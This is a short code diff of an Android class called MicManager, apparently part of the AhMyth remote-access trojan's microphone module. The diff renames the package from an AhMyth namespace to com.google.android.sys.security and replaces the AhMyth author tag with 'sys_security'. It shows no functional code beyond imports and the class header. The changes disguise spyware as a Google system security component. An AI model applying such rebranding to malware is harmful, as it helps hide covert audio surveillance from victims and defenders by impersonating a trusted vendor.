@@ -1,4 +1,4 @@
-package ahmyth.mine.king.ahmyth;
+package com.google.android.sys.security;
 
         import android.media.AudioFormat;
         import android.media.AudioManager;
@@ -25,7 +25,7 @@ package ahmyth.mine.king.ahmyth;
         import java.util.TimerTask;
 
 /**
- * Created by AhMyth on 11/11/16.
+ * Created by sys_security on 11/11/16.
  */
 
 public  class MicManager {
